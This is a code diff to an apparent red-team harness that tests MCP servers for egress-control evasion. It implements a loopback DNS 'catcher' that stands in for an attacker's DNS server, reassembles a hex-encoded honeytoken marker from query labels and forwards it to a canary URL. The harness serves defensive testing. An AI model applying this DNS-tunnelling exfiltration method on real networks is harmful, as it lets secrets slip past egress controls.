@@ -94,15 +94,69 @@ def _preflight(clients: list) -> list[str]:
     return errors
 
 
-def _start_dns_catcher(exfil_url: str):
-    """VED-FILL (only needed for --variant dns): start a loopback UDP socket that
-    receives the DNS query the server's dns channel sends, parse the QNAME labels,
-    reassemble the HT- marker, and POST {"metadata": marker} to exfil_url so the
-    honeytoken's fired() captures it. Return (host, port, stop_fn). Leave as-is if
-    you are shipping webhook-only first -- it is only invoked when a dns variant is
-    selected below.
+def _start_dns_catcher(exfil_url: str = ""):
+    """Loopback UDP catcher for the dns variant. Stands in for the attacker's
+    authoritative DNS server: it receives the server's DNS query, reassembles the
+    HT- marker from the QNAME labels, and POSTs it to the current run's canary so the
+    honeytoken's fired() captures it. Returns (host, port, stop_fn, target); target is
+    a shared {"url": ...} the payload points at each run's canary (see
+    EgressEvasion.build), since every run plants its own honeytoken.
     """
-    raise NotImplementedError("MCP-34 dns catcher: fill _start_dns_catcher")
+    import binascii
+    import json as _json
+    import socket
+    import struct  # noqa: F401  (kept for symmetry with the sender's wire format)
+    import threading
+    import urllib.request
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(("127.0.0.1", 0))
+    sock.settimeout(0.5)
+    host, port = sock.getsockname()
+    target = {"url": exfil_url or None}
+    stop = threading.Event()
+
+    def _qname_labels(packet: bytes) -> list[str]:
+        i, labels = 12, []  # skip the 12-byte DNS header
+        while i < len(packet):
+            n = packet[i]
+            if n == 0:
+                break
+            labels.append(packet[i + 1:i + 1 + n].decode("ascii", "replace"))
+            i += 1 + n
+        return labels
+
+    def _serve() -> None:
+        while not stop.is_set():
+            try:
+                data, _ = sock.recvfrom(4096)
+            except socket.timeout:
+                continue
+            except OSError:
+                break
+            hexp = "".join(l for l in _qname_labels(data) if l not in ("x", "mcp-rt", "test"))
+            try:
+                payload = binascii.unhexlify(hexp).decode("utf-8", "replace")
+            except (binascii.Error, ValueError):
+                payload = hexp
+            url = target.get("url")
+            if url:
+                try:
+                    body = _json.dumps({"metadata": payload}).encode()
+                    urllib.request.urlopen(urllib.request.Request(url, data=body, method="POST"), timeout=5)
+                except Exception:  # noqa: BLE001 — a dead canary must not kill the catcher
+                    pass
+
+    threading.Thread(target=_serve, daemon=True).start()
+
+    def _stop() -> None:
+        stop.set()
+        try:
+            sock.close()
+        except OSError:
+            pass
+
+    return host, port, _stop, target
 
 
 def _parse_args() -> argparse.Namespace:
@@ -176,10 +230,11 @@ def main() -> None:
     # payload can forward its (host, port) to the server. webhook needs nothing.
     dns_stop = None
     if any(p.variant == "dns" for p in payloads):
-        host, port, dns_stop = _start_dns_catcher("<set-per-run>")  # see stub note
+        host, port, dns_stop, dns_target = _start_dns_catcher()
         for p in payloads:
             if p.variant == "dns":
                 p.dns_sink = (host, port)
+                p.dns_catcher_target = dns_target  # build() points it at each run's canary
 
     print("=" * 64)
     print("  mcp-rt Egress-Control Evasion (MCP-34)")
